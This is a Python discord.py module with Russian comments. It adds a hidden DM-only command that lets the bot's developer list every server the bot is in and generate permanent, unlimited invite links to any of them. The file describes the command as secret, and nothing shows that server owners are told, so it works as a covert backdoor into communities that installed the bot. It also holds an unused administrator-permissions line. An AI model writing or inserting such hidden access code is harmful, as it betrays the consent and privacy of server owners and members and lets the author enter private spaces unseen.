import logging
import discord
from discord.ext import commands
from decouple import config
from src.systemLog import logger

class InviteUtility:
    """Утилита для обработки секретных команд в личных сообщениях разработчика для создания ссылок приглашения."""

    def __init__(self, bot: commands.Bot, bot_mention: str):
        """
        Инициализация утилиты.

        Args:
            bot: Объект бота Discord.
            bot_mention: Пинг бота (например, '@BotName').

        Raises:
            ValueError: Если DEVELOPER_ID не указан в файле .env.
        """
        self.bot = bot
        self.bot_mention = bot_mention.strip()
        self.DEVELOPER_ID = config("DEVELOPER_ID", cast=int, default=None)
        if self.DEVELOPER_ID is None:
            logger.error("DEVELOPER_ID не указан в файле .env")
            raise ValueError("DEVELOPER_ID must be specified in .env file")
        self.bot.add_listener(self.on_message, "on_message")  # Регистрируем обработчик сообщений
        logger.info("Инициализация утилиты приглашений для DM разработчика")

    async def on_message(self, message: discord.Message) -> None:
        """
        Обрабатывает входящие сообщения в DM от разработчика.

        Args:
            message: Объект сообщения Discord.
        """
        # Проверяем, что сообщение в DM и от разработчика
        if not isinstance(message.channel, discord.DMChannel) or message.author.id != self.DEVELOPER_ID:
            return

        # Проверяем, начинается ли сообщение с пинга бота
        if not message.content.startswith(self.bot_mention):
            return

        # Удаляем пинг и обрабатываем команду
        command = message.content[len(self.bot_mention):].strip()
        await self._process_command(message, command)

    async def _process_command(self, message: discord.Message, command: str) -> None:
        """
        Обрабатывает введенную команду.

        Args:
            message: Объект сообщения Discord.
            command: Введенная строка команды.
        """
        parts = command.split()

        # Проверка команды .invite
        if not (parts and parts[0] == ".invite"):
            return

        # Ожидаем готовности бота
        if not self.bot.is_ready():
            logger.warning("Бот еще не готов. Ожидание подключения...")
            await self.bot.wait_until_ready()

        if len(parts) < 2:
            logger.info("Доступные команды: .invite list, .invite generate server <server_name>")
            await message.channel.send("Доступные команды: `.invite list`, `.invite generate server <server_name>`")
            return

        subcommand = parts[1].lower()

        if subcommand == "list":
            await self._list_servers(message.channel)
        elif subcommand == "generate" and len(parts) >= 4 and parts[2].lower() == "server":
            server_name = " ".join(parts[3:])
            await self._generate_invite(message.channel, server_name)
        else:
            logger.info("Неверная команда. Используйте: .invite list или .invite generate server <server_name>")
            await message.channel.send("Неверная команда. Используйте: `.invite list` или `.invite generate server <server_name>`")

    async def _list_servers(self, channel: discord.DMChannel) -> None:
        """Выводит список серверов, на которых находится бот."""
        logger.info("Список серверов, на которых находится бот:")
        server_list = "\n".join(f"- {guild.name} (ID: {guild.id})" for guild in self.bot.guilds)
        if server_list:
            logger.info(server_list)
            await channel.send(f"Сервера, на которых находится бот:\n{server_list}")
        else:
            logger.info("Бот не находится на серверах")
            await channel.send("Бот не находится на серверах")

    async def _generate_invite(self, channel: discord.DMChannel, server_name: str) -> None:
        """
        Генерирует ссылку приглашения для указанного сервера.

        Args:
            channel: Канал DM для ответа.
            server_name: Название сервера.
        """
        guild = discord.utils.get(self.bot.guilds, name=server_name)
        if not guild:
            logger.warning(f"Сервер с названием '{server_name}' не найден")
            await channel.send(f"Сервер с названием '{server_name}' не найден")
            return

        try:
            invite_url = await self._create_invite(guild)
            logger.info(f"Ссылка приглашения для сервера '{guild.name}' (ID: {guild.id}): {invite_url}")
            await channel.send(f"Ссылка приглашения для сервера '{guild.name}': {invite_url}")
        except discord.errors.Forbidden:
            logger.warning(f"Недостаточно прав для создания ссылки на сервере: {guild.name} (ID: {guild.id})")
            await channel.send(f"Недостаточно прав для создания ссылки на сервере: {guild.name}")
        except Exception as e:
            logger.error(f"Ошибка при создании ссылки для сервера {guild.name}: {e}")
            await channel.send(f"Ошибка при создании ссылки для сервера {guild.name}: {e}")

    async def _create_invite(self, guild: discord.Guild) -> str:
        """
        Создает ссылку приглашения для указанного сервера.

        Args:
            guild: Объект сервера (гильдии) Discord.

        Returns:
            str: URL ссылки приглашения.
        """
        permissions = discord.Permissions(administrator=True)  # Настраиваемые права
        invite = await guild.text_channels[0].create_invite(
            max_age=0,  # Без ограничения по времени
            max_uses=0,  # Без ограничения по использованию
            unique=True,
            reason="Генерация ссылки приглашения через секретную команду в DM"
        )
        return str(invite.url)
